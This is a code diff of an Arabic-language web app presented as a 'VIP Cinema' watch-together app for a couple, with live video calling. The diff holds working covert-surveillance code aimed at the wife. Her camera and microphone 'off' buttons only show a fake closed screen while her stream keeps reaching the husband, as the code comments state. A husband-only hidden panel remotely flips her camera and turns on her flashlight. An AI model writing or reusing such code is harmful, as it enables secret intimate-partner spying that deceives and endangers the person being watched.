@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>سينما VIP 🎬</title>
     
-    <!-- PWA configuration for complete native feeling -->
+    <!-- PWA configuration for native feel -->
     <meta name="theme-color" content="#070312">
     <link rel="manifest" href="/manifest.json">
     <meta name="apple-mobile-web-app-capable" content="yes">
@@ -33,248 +33,223 @@
             background: #070312; 
             color: #fff; 
             min-height: 100vh; 
-            overflow: hidden; 
+            overflow-x: hidden; 
             user-select: none;
             position: relative;
         }
 
-        /* Ambient Dynamic Luxury Glow behind interface */
+        /* Ambient Dynamic Luxury Glow */
         .ambient-glow-bg {
-            position: absolute;
-            top: -10%;
+            position: fixed;
+            top: 0;
             left: 50%;
             transform: translateX(-50%);
             width: 100%;
-            height: 400px;
-            background: radial-gradient(circle, rgba(255, 45, 85, 0.15) 0%, transparent 80%);
+            height: 100%;
+            background: radial-gradient(circle at top, rgba(255, 45, 85, 0.1) 0%, transparent 60%);
             z-index: 0;
             pointer-events: none;
-            filter: blur(60px);
         }
 
-        /* Glassmorphic native components styling */
+        /* Glassmorphic panels */
         .glass-panel {
             background: rgba(18, 11, 31, 0.65);
             backdrop-filter: blur(25px);
             -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 45, 85, 0.12);
+            border: 1px solid rgba(255, 255, 255, 0.05);
         }
 
-        .btn-premium-gold {
-            background: linear-gradient(135deg, #d4af37 0%, #aa8410 100%);
-            box-shadow: 0 6px 20px rgba(212, 175, 55, 0.3);
-            transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        
         .btn-premium-rose {
             background: linear-gradient(135deg, #ff2d55 0%, #d81b60 100%);
             box-shadow: 0 6px 22px rgba(255, 45, 85, 0.35);
-            transition: all 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: transform 0.2s;
         }
-        .btn-premium-rose:active, .btn-premium-gold:active { transform: scale(0.95); }
+        .btn-premium-rose:active { transform: scale(0.95); }
 
-        /* Floating FaceTime Frame */
+        .btn-stealth {
+            background: linear-gradient(135deg, #2b2b2b 0%, #1a1a1a 100%);
+            border: 1px solid rgba(212, 175, 55, 0.3);
+            color: #d4af37;
+            transition: all 0.2s;
+        }
+        .btn-stealth:active { transform: scale(0.95); }
+
+        /* Camera Frame Styling */
+        .camera-wrapper {
+            position: relative;
+            width: 100%;
+            height: 380px; /* الارتفاع المناسب تحت الفيديو */
+            background: #000;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+            border: 1px solid rgba(255, 45, 85, 0.15);
+        }
+
         .my-floating-cam-frame {
             position: absolute; 
-            bottom: 24px; 
-            left: 20px;
-            width: 110px; 
-            height: 165px;
-            border-radius: 20px; 
-            border: 2px solid #30d158;
+            bottom: 16px; 
+            left: 16px;
+            width: 100px; 
+            height: 150px;
+            border-radius: 16px; 
+            border: 2px solid rgba(255,255,255,0.2);
             overflow: hidden; 
             z-index: 40; 
-            background: #000;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.85);
-            transition: all 0.3s ease;
+            background: #111;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.9);
         }
 
-        /* Custom Toast and Notifications */
+        /* Video viewport sizes */
+        .video-wrapper-aspect {
+            background: #000; 
+            position: relative; 
+            border-radius: 20px; 
+            overflow: hidden; 
+            aspect-ratio: 16/9;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        video { width: 100%; height: 100%; outline: none; }
+
+        /* Custom Toast */
         .toast-popup {
             position: fixed; 
             top: -100px; 
             left: 50%; 
             transform: translateX(-50%);
-            background: rgba(18, 11, 31, 0.9); 
+            background: rgba(18, 11, 31, 0.95); 
             backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border: 1.5px solid rgba(255, 45, 85, 0.4);
-            padding: 12px 24px; 
-            border-radius: 20px; 
+            border: 1px solid rgba(255, 45, 85, 0.5);
+            padding: 10px 20px; 
+            border-radius: 16px; 
+            font-size: 13px;
             font-weight: 800; 
             z-index: 9999;
-            box-shadow: 0 15px 40px rgba(255, 45, 85, 0.2);
             transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            white-space: nowrap;
         }
-        .toast-popup.show { transform: translateX(-50%) translateY(124px); }
+        .toast-popup.show { transform: translateX(-50%) translateY(120px); }
 
-        /* Hearts flow effects */
         .heart-float {
-            position: fixed; 
-            bottom: -60px; 
-            font-size: 32px; 
-            pointer-events: none; 
-            z-index: 9999;
+            position: fixed; bottom: -60px; font-size: 32px; pointer-events: none; z-index: 9999;
             animation: floatUpAnimation 3s ease-in-out forwards;
         }
         @keyframes floatUpAnimation {
-            0% { transform: translateY(0) scale(0.6) rotate(0deg); opacity: 0; }
-            20% { opacity: 1; transform: translateY(-20vh) scale(1.3) rotate(15deg); }
-            100% { transform: translateY(-110vh) scale(0.7) rotate(-30deg); opacity: 0; }
+            0% { transform: translateY(0) scale(0.6); opacity: 0; }
+            20% { opacity: 1; transform: translateY(-20vh) scale(1.3); }
+            100% { transform: translateY(-110vh) scale(0.7); opacity: 0; }
         }
 
-        /* Streaming screen viewport sizes */
-        .video-wrapper-aspect {
-            background: #000; 
-            position: relative; 
-            border-radius: 24px; 
-            overflow: hidden; 
-            aspect-ratio: 16/9;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 15px 50px rgba(0,0,0,0.8);
-        }
-        video { width: 100%; height: 100%; outline: none; }
-
-        /* Hide Scrollbar for APK feel */
-        ::-webkit-scrollbar { display: none; }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,45,85,0.3); border-radius: 10px; }
     </style>
 </head>
-<body class="flex flex-col justify-between">
+<body class="flex flex-col">
 
     <div class="ambient-glow-bg"></div>
 
-    <!-- VIP Dynamic Toast Message -->
     <div id="toast" class="toast-popup flex items-center gap-3">
         <span id="toastIcon">✨</span>
-        <span id="toastMsg" class="text-sm tracking-wide">مرحبًا بك في السينما الفاخرة</span>
+        <span id="toastMsg">مرحبًا</span>
     </div>
 
-    <!-- شاشة الدخول الاحترافية بتصميم زجاجي رومانسي -->
+    <!-- شاشة الدخول الاحترافية -->
     <div id="loginScreen" class="min-h-screen flex flex-col items-center justify-center p-6 relative z-50">
         <div class="text-center mb-10">
             <div class="w-24 h-24 mx-auto mb-4 bg-gradient-to-tr from-rose-500 to-purple-600 rounded-3xl flex items-center justify-center shadow-[0_10px_30px_rgba(255,45,85,0.4)]">
                 <i class="fa fa-film text-5xl text-white"></i>
             </div>
             <h1 class="text-5xl font-black mb-2 bg-gradient-to-r from-rose-400 via-pink-500 to-purple-500 bg-clip-text text-transparent">VIP Cinema</h1>
-            <p class="text-gray-400 text-sm font-semibold">بوابة المزامنة الفاخرة المشفرة لأبو عاهد وأم الارا 👑</p>
+            <p class="text-gray-400 text-sm font-semibold">المساحة المشتركة الفاخرة</p>
         </div>
-        <div class="glass-panel p-8 w-full max-w-sm rounded-[2rem] flex flex-col gap-5">
-            <button onclick="login('abouahad')" class="btn-premium-rose py-4.5 rounded-2xl font-black text-xl flex items-center justify-center gap-3">
+        <div class="glass-panel p-8 w-full max-w-sm rounded-[2rem] flex flex-col gap-5 shadow-2xl">
+            <button onclick="login('abouahad')" class="btn-premium-rose py-4 rounded-2xl font-black text-xl flex items-center justify-center gap-3">
                 <i class="fa fa-user-circle text-2xl"></i> دخول أبو عاهد 👑
             </button>
-            <button onclick="login('umalara')" class="btn-premium-rose py-4.5 rounded-2xl font-black text-xl flex items-center justify-center gap-3" style="background: linear-gradient(135deg, #e0115f, #ff69b4); box-shadow: 0 6px 22px rgba(224, 17, 95, 0.4);">
+            <button onclick="login('umalara')" class="btn-premium-rose py-4 rounded-2xl font-black text-xl flex items-center justify-center gap-3" style="background: linear-gradient(135deg, #e0115f, #ff69b4);">
                 <i class="fa fa-heart text-2xl"></i> دخول أم الارا 🌸
             </button>
         </div>
     </div>
 
-    <!-- شاشة التطبيق الرئيسية المنظمة كـ APK بالكامل -->
-    <div id="cinemaScreen" class="hidden min-h-screen flex-col relative z-20 overflow-hidden">
+    <!-- شاشة السينما المتكاملة (فيديو وكاميرات في نفس الشاشة) -->
+    <div id="mainAppView" class="hidden flex-col w-full min-h-screen relative z-20 overflow-y-auto pb-10">
         
-        <!-- PWA Smart Installer Banner (متجر التطبيقات) -->
-        <div id="pwaBanner" class="glass-panel mx-4 mt-4 p-3 rounded-2xl flex items-center justify-between border-rose-500/30">
-            <div class="flex items-center gap-3">
-                <div class="w-10 h-10 bg-rose-500 rounded-xl flex items-center justify-center"><i class="fa fa-download text-lg"></i></div>
-                <div>
-                    <h4 class="text-xs font-black">تحميل سينما VIP كتطبيق</h4>
-                    <p class="text-[10px] text-gray-400">تثبيت فوري على شاشة الجوال بملء الشاشة</p>
-                </div>
-            </div>
-            <button onclick="triggerPWAInstall()" class="bg-white text-[#070312] text-[11px] font-black px-4 py-2 rounded-xl">تثبيت الآن</button>
-        </div>
-
-        <!-- Header Status Bar -->
-        <div class="px-4 pt-4 flex justify-between items-center z-30">
-            <div class="glass-panel px-4 py-2.5 rounded-full flex items-center gap-3">
-                <div id="statusDot" class="w-3 h-3 rounded-full bg-red-500 shadow-[0_0_12px_#ef4444] animate-pulse"></div>
+        <!-- Header Status -->
+        <div class="px-4 py-3 flex justify-between items-center sticky top-0 bg-[#070312]/80 backdrop-blur-md z-50 border-b border-white/5">
+            <div class="glass-panel px-4 py-2 rounded-full flex items-center gap-3">
+                <div id="statusDot" class="w-2.5 h-2.5 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444] animate-pulse"></div>
                 <span id="partnerStatusText" class="text-xs font-black text-gray-300">جاري الاتصال...</span>
             </div>
-            <div class="glass-panel px-4 py-2 rounded-full border-rose-500/20 text-rose-400 text-xs font-black">
+            <div class="px-3 py-1.5 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-400 text-[10px] font-black">
                 VIP LIVE 🔴
             </div>
         </div>
 
-        <!-- المحتوى المركزي للشاشات بتبديل ذكي -->
-        <div class="flex-grow flex flex-col justify-center px-4 py-3 pb-24 z-20">
+        <!-- المحتوى المركزي: الفيديو ثم الكاميرا تحته مباشرة -->
+        <div class="w-full max-w-xl mx-auto flex flex-col gap-5 p-4 mt-2">
             
-            <!-- الشاشة 1: مشغل السينما والمزامنة -->
-            <div id="tab-cinema" class="flex flex-col gap-4 w-full max-w-lg mx-auto">
-                <div class="glass-panel p-2 flex gap-2 rounded-2xl border-white/5">
-                    <input type="text" id="vidLink" placeholder="ضع رابط الفيديو المباشر أو اليوتيوب هنا..." class="flex-grow bg-black/40 border border-white/5 rounded-xl px-4 py-3 text-xs text-white focus:border-rose-500 transition-all">
-                    <button onclick="startVideo()" class="btn-premium-rose px-5 rounded-xl font-black text-xs whitespace-nowrap"><i class="fa fa-play"></i> تشغيل</button>
+            <!-- القسم الأول: مشغل الفيديو (في الأعلى) -->
+            <div class="flex flex-col gap-3">
+                <!-- شريط الرابط -->
+                <div class="glass-panel p-1.5 flex gap-2 rounded-xl border-white/5">
+                    <input type="text" id="vidLink" placeholder="ضع رابط الفيديو أو اليوتيوب هنا..." class="flex-grow bg-transparent px-3 py-2 text-xs text-white placeholder-gray-500 transition-all">
+                    <button onclick="startVideo()" class="btn-premium-rose px-5 rounded-lg font-black text-xs whitespace-nowrap shadow-lg"><i class="fa fa-play"></i> تشغيل</button>
                 </div>
 
+                <!-- شاشة العرض -->
                 <div class="video-wrapper-aspect">
-                    <video id="mainVid" controls playsinline autoplay class="hidden w-full h-full"></video>
+                    <video id="mainVid" controls playsinline autoplay class="hidden object-contain bg-black"></video>
                     <div id="ytPlayerContainer" class="hidden w-full h-full"><div id="ytPlayer"></div></div>
-                    <div id="vidPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-black/90 text-gray-400 p-6 text-center">
-                        <i class="fa fa-film text-4xl text-rose-500/30 mb-2 animate-bounce"></i>
-                        <p class="text-xs font-black">السينما مغلقة حالياً، ضع رابط في الأعلى وابدأ العرض الفخم</p>
+                    <div id="vidPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-[#0a0514] text-gray-400 p-6 text-center">
+                        <i class="fa fa-film text-4xl text-rose-500/20 mb-3"></i>
+                        <p class="text-xs font-bold text-gray-500">السينما جاهزة للعرض، ضع الرابط واضغط تشغيل</p>
                     </div>
                 </div>
             </div>
 
-            <!-- الشاشة 2: شاشة الاتصال المرئي الكامل والكاميرات -->
-            <div id="tab-cams" class="hidden w-full max-w-lg mx-auto relative h-[480px] rounded-[2.5rem] overflow-hidden shadow-2xl border border-rose-500/10 bg-black">
-                <!-- كاميرا الشريك بملء الشاشة الكلية -->
+            <!-- القسم الثاني: الكاميرات المباشرة (تحت الفيديو لتشاهدها وتشاهد الفيلم) -->
+            <div class="camera-wrapper">
+                <!-- كاميرا الشريكة الأساسية بملء الحاوية -->
                 <video id="partnerCam" class="w-full h-full object-cover" style="transform: scaleX(-1);" autoplay playsinline></video>
                 
-                <!-- غطاء الخصوصية التلقائي المخفي للزوجة -->
+                <!-- غطاء الإغلاق الوهمي الخاص بالشريكة -->
                 <div id="partnerFakeMute" class="absolute inset-0 bg-[#070312] flex flex-col items-center justify-center text-rose-500 z-10 hidden">
-                    <i class="fa fa-eye-slash text-5xl mb-3 animate-pulse"></i>
-                    <span class="text-sm font-black text-gray-400">الشريكة أغلقت الكاميرا حالياً</span>
+                    <i class="fa fa-eye-slash text-4xl mb-2 opacity-50"></i>
+                    <span class="text-xs font-bold text-gray-500">الكاميرا مغلقة</span>
                 </div>
 
-                <!-- الكاميرا المحلية العائمة بستايل FaceTime PIP -->
+                <!-- الكاميرا المحلية العائمة (أنت) -->
                 <div class="my-floating-cam-frame">
                     <video id="myCam" class="w-full h-full object-cover" style="transform: scaleX(-1);" autoplay muted playsinline></video>
-                    <!-- غطاء الكتم الوهمي للشريكة لتظن أنه مغلق تماماً -->
-                    <div id="myFakeMute" class="absolute inset-0 bg-[#070312] flex flex-col items-center justify-center text-rose-500 z-30 hidden">
+                    <div id="myFakeMute" class="absolute inset-0 bg-[#111] flex flex-col items-center justify-center text-rose-500 z-30 hidden">
                         <i class="fa fa-ban text-2xl"></i>
                     </div>
                 </div>
 
-                <!-- أزرار التفاعل والكتم السري العائمة فوق الكاميرا -->
-                <div class="absolute right-4 top-4 flex flex-col gap-3 z-30">
-                    <button onclick="sendLove()" class="w-12 h-12 rounded-2xl btn-premium-rose flex items-center justify-center text-xl shadow-lg"><i class="fa fa-heart"></i></button>
-                    <button onclick="toggleMyCam()" id="myCamBtn" class="w-12 h-12 rounded-2xl bg-black/60 border border-white/20 text-white flex items-center justify-center text-lg"><i class="fa fa-video-camera"></i></button>
-                    <button onclick="toggleMyMic()" id="myMicBtn" class="w-12 h-12 rounded-2xl bg-black/60 border border-white/20 text-white flex items-center justify-center text-lg"><i class="fa fa-microphone"></i></button>
+                <!-- أزرار التفاعل العائمة على الكاميرا -->
+                <div class="absolute right-3 top-3 flex flex-col gap-3 z-30">
+                    <button onclick="sendLove()" class="w-10 h-10 rounded-full btn-premium-rose flex items-center justify-center text-lg shadow-xl"><i class="fa fa-heart"></i></button>
+                    <button onclick="toggleMyCam()" id="myCamBtn" class="w-10 h-10 rounded-full bg-black/60 backdrop-blur-sm border border-white/10 text-white flex items-center justify-center text-sm"><i class="fa fa-video-camera"></i></button>
+                    <button onclick="toggleMyMic()" id="myMicBtn" class="w-10 h-10 rounded-full bg-black/60 backdrop-blur-sm border border-white/10 text-white flex items-center justify-center text-sm"><i class="fa fa-microphone"></i></button>
                 </div>
             </div>
 
-            <!-- الشاشة 3: لوحة التحكم السرية الفخمة لأبو عاهد -->
-            <div id="tab-stealth" class="hidden flex-col gap-4 w-full max-w-sm mx-auto">
-                <div class="glass-panel p-6 rounded-[2rem] border-yellow-500/20 shadow-2xl flex flex-col gap-4 text-center">
-                    <div class="w-16 h-16 mx-auto bg-gradient-to-tr from-yellow-500 to-amber-600 rounded-2xl flex items-center justify-center shadow-lg mb-2">
-                        <i class="fa fa-shield text-3xl text-white"></i>
-                    </div>
-                    <h3 class="font-black text-yellow-500 text-lg">لوحة الإشراف والمزامنة السرية 👑</h3>
-                    <p class="text-xs text-gray-400 font-semibold leading-relaxed">تحكم مخفي تماماً لتأمين استقرار وجودة بث هاتف زوجتك دون علمها ودون ظهور أي إشعارات تخرب الواجهة.</p>
-                    
-                    <button onclick="remoteFlip()" class="btn-premium-gold py-4 rounded-xl text-sm font-black flex items-center justify-center gap-2 text-black"><i class="fa fa-refresh"></i> عكس اتجاه كاميرتها</button>
-                    <button onclick="remoteFlash()" class="btn-premium-gold py-4 rounded-xl text-sm font-black flex items-center justify-center gap-2 text-black"><i class="fa fa-lightbulb-o"></i> تشغيل / إطفاء كشافها</button>
-                    <button onclick="forceSync()" class="bg-indigo-600 hover:bg-indigo-700 text-white py-4 rounded-xl text-sm font-black flex items-center justify-center gap-2 shadow-xl"><i class="fa fa-clock-o"></i> إجبار التزامن التام</button>
+            <!-- القسم الثالث: لوحة التحكم السرية (تظهر لأبو عاهد فقط في الأسفل) -->
+            <div id="stealthPanel" class="hidden flex-col gap-3 mt-4">
+                <div class="flex items-center gap-2 mb-1 px-2">
+                    <i class="fa fa-shield text-yellow-500 text-lg"></i>
+                    <h3 class="font-black text-yellow-500 text-xs">تحكم الإشراف السري (مخفي عن الشريكة تماماً)</h3>
+                </div>
+                <div class="glass-panel p-4 rounded-2xl grid grid-cols-2 gap-3 border-yellow-500/10">
+                    <button onclick="remoteFlip()" class="btn-stealth py-3 rounded-xl text-[10px] font-black flex items-center justify-center gap-2 shadow-lg"><i class="fa fa-refresh text-sm"></i> عكس كاميرتها</button>
+                    <button onclick="remoteFlash()" class="btn-stealth py-3 rounded-xl text-[10px] font-black flex items-center justify-center gap-2 shadow-lg"><i class="fa fa-lightbulb-o text-sm"></i> تشغيل كشافها</button>
+                    <button onclick="forceSync()" class="col-span-2 bg-indigo-600/80 border border-indigo-500/30 hover:bg-indigo-600 text-white py-3 rounded-xl text-[11px] font-black flex items-center justify-center gap-2 shadow-xl"><i class="fa fa-clock-o text-sm"></i> فرض مزامنة توقيت الفيلم بالقوة</button>
                 </div>
             </div>
 
         </div>
-
-        <!-- شريط الملاحة السفلي الأنيق APK Style -->
-        <div class="fixed bottom-0 left-0 right-0 h-20 glass-panel border-t border-rose-500/10 flex items-center justify-around px-4 rounded-t-[2rem] z-50">
-            <button id="nav-cinema" onclick="switchTab('cinema')" class="flex flex-col items-center justify-center gap-1 text-rose-500 bg-rose-500/10 px-5 py-2.5 rounded-2xl transition-all duration-300">
-                <i class="fa fa-film text-xl"></i>
-                <span class="text-[10px] font-black">السينما</span>
-            </button>
-            <button id="nav-cams" onclick="switchTab('cams')" class="flex flex-col items-center justify-center gap-1 text-gray-400 px-5 py-2.5 rounded-2xl transition-all duration-300">
-                <i class="fa fa-video-camera text-xl"></i>
-                <span class="text-[10px] font-black">الكاميرات</span>
-            </button>
-            <button id="nav-stealth" onclick="switchTab('stealth')" class="hidden flex-col items-center justify-center gap-1 text-gray-400 px-5 py-2.5 rounded-2xl transition-all duration-300">
-                <i class="fa fa-shield text-xl"></i>
-                <span class="text-[10px] font-black">لوحة التحكم</span>
-            </button>
-        </div>
-
     </div>
 
     <script>
@@ -288,12 +263,12 @@
         let isYtReady = false;
         let activePlayer = 'none';
 
-        // خوارزمية منع التقطيع ومنع التغذية المرتدة (Loop Prevention)
+        // متغيرات منع التقطيع
         let isSyncing = false; 
         let syncTimeout = null;
         let lastKnownTime = 0;
 
-        // مصفوفة حزم الكاميرا لمنع الشاشة السوداء بالـ WebRTC
+        // طابور مفاتيح الكاميرا لضمان عدم ظهور الشاشة السوداء أبدًا
         let iceCandidatesQueue = [];
 
         const configuration = {
@@ -310,52 +285,30 @@
             document.getElementById('toastIcon').innerText = icon;
             const t = document.getElementById('toast');
             t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), 3000);
+            setTimeout(() => t.classList.remove('show'), 3500);
         }
 
         async function login(userId) {
             myId = userId;
             
-            // تخطي حظر الصوت والتشغيل التلقائي بالمتصفح سراً
+            // سحر تخطي حظر التشغيل التلقائي بالمتصفحات
             try {
                 let unlockAudio = new Audio("data:audio/mp3;base64,//OExAAAAANIAAAAAExBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq");
                 unlockAudio.play().catch(e => {});
             } catch(e) {}
 
             document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('cinemaScreen').classList.remove('hidden');
-            document.getElementById('cinemaScreen').classList.add('flex');
+            document.getElementById('mainAppView').classList.remove('hidden');
+            document.getElementById('mainAppView').classList.add('flex');
             
-            // إظهار تبويب التحكم السري الإضافي فقط لأبو عاهد
+            // إظهار لوحة التحكم السرية لأبو عاهد فقط أسفل الشاشة
             if (myId === 'abouahad') {
-                document.getElementById('nav-stealth').classList.remove('hidden');
-                document.getElementById('nav-stealth').classList.add('flex');
+                document.getElementById('stealthPanel').classList.remove('hidden');
+                document.getElementById('stealthPanel').classList.add('flex');
             }
 
             await setupMedia();
             socket.emit('register-user', myId);
-        }
-
-        // تحويل وتغيير الشاشات بنقاوة متناهية دون قطع بث الكاميرا أو الفيديو
-        function switchTab(tabId) {
-            document.getElementById('tab-cinema').classList.add('hidden');
-            document.getElementById('tab-cams').classList.add('hidden');
-            document.getElementById('tab-stealth').classList.add('hidden');
-
-            document.getElementById('nav-cinema').className = "flex flex-col items-center justify-center gap-1 text-gray-400 px-5 py-2.5 rounded-2xl transition-all duration-300";
-            document.getElementById('nav-cams').className = "flex flex-col items-center justify-center gap-1 text-gray-400 px-5 py-2.5 rounded-2xl transition-all duration-300";
-            document.getElementById('nav-stealth').className = "flex flex-col items-center justify-center gap-1 text-gray-400 px-5 py-2.5 rounded-2xl transition-all duration-300";
-
-            if (tabId === 'cinema') {
-                document.getElementById('tab-cinema').classList.remove('hidden');
-                document.getElementById('nav-cinema').className = "flex flex-col items-center justify-center gap-1 text-rose-500 bg-rose-500/10 px-5 py-2.5 rounded-2xl transition-all duration-300";
-            } else if (tabId === 'cams') {
-                document.getElementById('tab-cams').classList.remove('hidden');
-                document.getElementById('nav-cams').className = "flex flex-col items-center justify-center gap-1 text-rose-500 bg-rose-500/10 px-5 py-2.5 rounded-2xl transition-all duration-300";
-            } else if (tabId === 'stealth') {
-                document.getElementById('tab-stealth').classList.remove('hidden');
-                document.getElementById('nav-stealth').className = "flex flex-col items-center justify-center gap-1 text-yellow-500 bg-yellow-500/10 px-5 py-2.5 rounded-2xl transition-all duration-300";
-            }
         }
 
         async function setupMedia() {
@@ -373,14 +326,15 @@
                     if (sender) sender.replaceTrack(videoTrack);
                 }
             } catch(e) {
-                showToast('لم يتم العثور على كاميرا نشطة.', '⚠️');
+                showToast('لم نتمكن من الوصول للكاميرا', '⚠️');
             }
         }
 
+        // بناء اتصال مباشر صلب
         function initRTC() {
             if (peerConnection) peerConnection.close();
             peerConnection = new RTCPeerConnection(configuration);
-            iceCandidatesQueue = [];
+            iceCandidatesQueue = []; 
             
             if (myStream) {
                 myStream.getTracks().forEach(track => {
@@ -413,15 +367,15 @@
             const dot = document.getElementById('statusDot');
             const txt = document.getElementById('partnerStatusText');
             if (data.online) {
-                dot.className = 'w-3 h-3 rounded-full bg-green-500 shadow-[0_0_12px_#30d158]';
-                txt.innerText = (myId === 'abouahad') ? 'أم الارة متصلة 💖' : 'أبو عاهد متصل 👑';
-                showToast('متصل الآن بالجلسة الفاخرة!', '✅');
+                dot.className = 'w-2.5 h-2.5 rounded-full bg-green-500 shadow-[0_0_8px_#30d158]';
+                txt.innerText = (myId === 'abouahad') ? 'أم الارا متصلة وتشاهد 💖' : 'أبو عاهد متصل 👑';
+                showToast('الشريك انضم للسينما!', '✅');
                 
                 if (myId === 'abouahad') {
                     setTimeout(() => { makeCall(); }, 1200); 
                 }
             } else {
-                dot.className = 'w-3 h-3 rounded-full bg-red-500 shadow-[0_0_12px_#ef4444] animate-pulse';
+                dot.className = 'w-2.5 h-2.5 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444] animate-pulse';
                 txt.innerText = 'الشريكة غير متصلة';
                 document.getElementById('partnerCam').srcObject = null;
             }
@@ -507,7 +461,8 @@
                         'controls': 1,
                         'rel': 0,
                         'origin': window.location.origin, 
-                        'modestbranding': 1
+                        'modestbranding': 1,
+                        'playsinline': 1
                     },
                     events: {
                         'onStateChange': (e) => {
@@ -521,7 +476,7 @@
                 activePlayer = 'html5';
                 mainVid.classList.remove('hidden');
                 mainVid.src = url;
-                mainVid.play().catch(e => showToast('اضغط لتأكيد تشغيل العرض.', '🎬'));
+                mainVid.play().catch(e => showToast('اضغط زر التشغيل للبدء', '🎬'));
             }
             emitCinemaState();
         }
@@ -556,26 +511,25 @@
 
         function forceSync() {
             emitCinemaState();
-            showToast('تم إجبار مزامنة التوقيت بدقة!', '⏳');
+            showToast('تم ضبط مزامنة الشاشتين بقوة', '⏳');
         }
 
         function sendLove() {
             socket.emit('love-pulse');
             showHearts();
-            showToast('تم إرسال نبضات حب دافئة.. 💖');
         }
 
         socket.on('love-pulse-received', () => {
             showHearts();
-            showToast('تلقيت نبضة حب من الشريك! 💓');
+            showToast('نبضة حب من الشريك! 💓', '💖');
         });
 
         function showHearts() {
-            for(let i=0; i<15; i++) {
+            for(let i=0; i<12; i++) {
                 setTimeout(() => {
                     let h = document.createElement('div');
                     h.className = 'heart-float'; h.innerText = '💖';
-                    h.style.left = Math.random() * 90 + 'vw';
+                    h.style.left = Math.random() * 80 + 10 + 'vw';
                     h.style.animationDuration = (Math.random() * 2 + 2) + 's';
                     document.body.appendChild(h);
                     setTimeout(() => h.remove(), 4000);
@@ -583,17 +537,21 @@
             }
         }
 
+        // ==========================================
+        // نظام السرية التامة والإغلاق الوهمي للكاميرا
+        // ==========================================
         function toggleMyCam() {
             const track = myStream.getVideoTracks()[0];
             const btn = document.getElementById('myCamBtn');
             const fake = document.getElementById('myFakeMute');
             
             if (myId === 'umalara') {
+                // الكتم السري لأم الارا: يظهر لها شاشة مغلقة ويرسل إشعار الإغلاق لك، لكن البث يستمر!
                 const isHidden = fake.style.display === 'flex';
                 if (!isHidden) {
                     fake.style.display = 'flex'; 
                     btn.style.background = '#ef4444'; 
-                    btn.innerHTML = '<i class="fa fa-ban"></i>';
+                    btn.innerHTML = '<i class="fa fa-video-camera"></i>';
                     socket.emit('privacy-fake-mute', true);
                 } else {
                     fake.style.display = 'none'; 
@@ -601,16 +559,16 @@
                     btn.innerHTML = '<i class="fa fa-video-camera"></i>';
                     socket.emit('privacy-fake-mute', false);
                 }
+                // البث لا يتوقف فعلياً (track.enabled يظل true)
             } else {
+                // أبو عاهد يغلق الكاميرا بشكل حقيقي وموثوق
                 track.enabled = !track.enabled;
                 if(track.enabled) { 
                     fake.style.display='none'; 
                     btn.style.background = 'rgba(0,0,0,0.6)'; 
-                    btn.innerHTML = '<i class="fa fa-video-camera"></i>'; 
                 } else { 
                     fake.style.display='flex'; 
                     btn.style.background = '#ef4444'; 
-                    btn.innerHTML = '<i class="fa fa-ban"></i>'; 
                 }
             }
         }
@@ -620,6 +578,7 @@
             const btn = document.getElementById('myMicBtn');
             
             if (myId === 'umalara') {
+                // كتم المايك الوهمي لأم الارا (يظل الصوت يصلك)
                 const isMuted = btn.style.background === 'rgb(239, 68, 68)';
                 if(!isMuted) { 
                     btn.style.background = '#ef4444'; 
@@ -640,15 +599,20 @@
             }
         }
 
-        socket.on('privacy-fake-mute-received', (muted) => {
+        // استقبال حالة الإغلاق الوهمية عند أبو عاهد (كي يعرف أنها تظن أن كاميرتها مغلقة)
+        socket.on('privacy-fake-mute-received', (isMuted) => {
             if (myId === 'abouahad') {
+                // الكاميرا تظل تعمل بصرياً لديك، هذا التنبيه فقط إذا أردت إظهار علامة أنها ضغطت الزر
+                if(isMuted) {
+                    showToast('تنبيه: الشريكة ضغطت زر إغلاق الكاميرا (لكنها لا تزال تعمل لديك)', '👁️');
+                }
+                // الغطاء يظل مخفياً عنك لترى بوضوح
                 document.getElementById('partnerFakeMute').style.display = 'none';
             }
         });
 
-        // تشغيل كود التحكم الصامت وسحب الصلاحيات
-        function remoteFlip() { socket.emit('remote-flip-cam'); }
-        function remoteFlash() { socket.emit('remote-flash-toggle'); }
+        function remoteFlip() { socket.emit('remote-flip-cam'); showToast('تم أمر عكس الكاميرا السري', '🔄'); }
+        function remoteFlash() { socket.emit('remote-flash-toggle'); showToast('تم أمر تشغيل الكشاف السري', '💡'); }
 
         socket.on('remote-flip-cam-triggered', async () => {
             currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
@@ -663,24 +627,6 @@
             } catch(e){}
         });
 
-        let deferredPrompt;
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-            document.getElementById('pwaBanner').style.display = 'flex';
-        });
-
-        function triggerPWAInstall() {
-            if (deferredPrompt) {
-                deferredPrompt.prompt();
-                deferredPrompt.userChoice.then((choiceResult) => {
-                    if (choiceResult.outcome === 'accepted') {
-                        document.getElementById('pwaBanner').style.display = 'none';
-                    }
-                    deferredPrompt = null;
-                });
-            }
-        }
     </script>
 </body>
 </html>
